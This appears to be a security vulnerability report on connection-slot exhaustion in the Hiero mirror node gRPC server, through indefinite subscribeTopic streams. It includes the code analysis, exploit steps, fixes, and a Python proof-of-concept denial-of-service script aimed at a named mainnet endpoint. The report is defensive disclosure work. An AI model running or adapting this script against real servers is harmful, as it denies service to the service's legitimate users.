### Title
Unbounded Indefinite gRPC Server-Streaming Streams Enable Connection-Slot Exhaustion DoS

### Summary
The Netty gRPC server in `GrpcConfiguration.java` configures only `maxConcurrentCallsPerConnection` (default 5) but sets no connection idle timeout, connection max age, or keepalive enforcement. A `subscribeTopic` call with no `consensusEndTime` and no `limit` produces a `Flux.never()`-terminated stream that runs indefinitely by design. An unprivileged attacker can open many connections, fill all 5 slots per connection with indefinite streams, and exhaust server-side reactive pipeline resources, denying service to legitimate callers.

### Finding Description
**Code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java` lines 27–35 — the only `NettyServerBuilder` customization applied is:
```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
No `maxConnectionIdle`, `maxConnectionAge`, `maxConnectionAgeGrace`, `keepAliveTimeout`, or `permitKeepAliveTime` is set anywhere in the codebase (confirmed by exhaustive grep).

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java` line 14 — the only tunable is `maxConcurrentCallsPerConnection = 5`.

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java` lines 123–125:
```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();  // no termination signal ever emitted
    }
```
When a client sends a `ConsensusTopicQuery` with no `consensusEndTime` and no `limit` (both explicitly optional per the proto spec: "If not set it will receive indefinitely"), `pastEndTime()` returns `Flux.never()`, and `subscribeTopic` in `TopicMessageServiceImpl` applies neither `takeWhile` (line 80) nor `take` (line 84). The resulting reactive pipeline stays alive indefinitely, holding one `maxConcurrentCallsPerConnection` slot.

**Root cause:** The server assumes clients will eventually cancel or set a deadline. No server-enforced wall-clock limit exists on how long a single streaming RPC may occupy a concurrent-call slot.

**Exploit flow:**
1. Attacker opens `K` TCP connections to port 5600 (no authentication required).
2. On each connection, issues 5 `subscribeTopic` RPCs with a valid topic ID, no `consensusEndTime`, no `limit`, and a `consensusStartTime` in the past (so historical retrieval completes quickly and the stream transitions to the live `incomingMessages` path).
3. Each stream enters `topicListener.listen()` (Redis/poll loop) and blocks indefinitely on `Flux.never()` from `pastEndTime`.
4. All 5 × K slots are now occupied. New RPCs on those connections are rejected with `RESOURCE_EXHAUSTED`. New connections can be opened but the thread pool (`applicationTaskExecutor`) and reactive scheduler (`boundedElastic`) are progressively saturated as K grows.
5. Optionally, the attacker reads responses very slowly (HTTP/2 flow-control window exhaustion), causing the server to buffer messages in memory per stream.

### Impact Explanation
Every occupied slot is a live Reactor pipeline backed by a Redis subscription or DB polling loop, consuming scheduler threads, memory, and Redis/DB connections. With `maxConcurrentCallsPerConnection = 5` and no global cap on connections, the attacker scales the attack linearly with the number of open TCP connections. Legitimate users sharing a connection (e.g., SDK clients reusing a channel) receive `RESOURCE_EXHAUSTED` immediately. At sufficient scale the `boundedElastic` scheduler queue fills, causing all new subscriptions — including any `NetworkService` staking-data queries routed through the same server — to be rejected or time out.

### Likelihood Explanation
No authentication or payment is required to call `subscribeTopic`. The proto contract explicitly advertises indefinite streaming as the default behavior, so the attacker needs only a standard gRPC client. The attack is trivially scriptable (open N channels, call `subscribeTopic` with no end time on each), requires no special knowledge of the system internals, and is repeatable. The only external mitigant is the GCP `maxRatePerEndpoint: 250` gateway policy, which limits request rate but not the number of concurrently held open streams.

### Recommendation
In `GrpcConfiguration.java`, add the following to the `ServerBuilderCustomizer` lambda:
```java
serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);
serverBuilder.maxConnectionAge(10, TimeUnit.MINUTES);
serverBuilder.maxConnectionAgeGrace(30, TimeUnit.SECONDS);
serverBuilder.keepAliveTimeout(20, TimeUnit.SECONDS);
```
Additionally, add a `maxStreamDuration` property to `NettyProperties` and apply `serverBuilder.maxCallDuration(...)` (available in grpc-java ≥ 1.54) to enforce a per-RPC wall-clock cap independent of client-set deadlines. For the application layer, add a configurable `maxSubscriptionDuration` in `TopicMessageServiceImpl.subscribeTopic` using `.timeout(maxDuration)` on the returned `Flux`.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_NUM = 1  # any valid topic

def hold_slot(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM)
        # no consensusEndTime, no limit → indefinite stream
    )
    for _ in stub.subscribeTopic(req):  # never returns
        pass

channels = [grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
            for _ in range(100)]  # 100 connections × 5 slots = 500 held streams

threads = []
for ch in channels:
    for _ in range(5):
        t = threading.Thread(target=hold_slot, args=(ch,), daemon=True)
        t.start()
        threads.append(t)

# All 500 slots now occupied; new subscribeTopic calls on these channels
# receive RESOURCE_EXHAUSTED immediately.
input("Attack running. Press Enter to stop.")
```
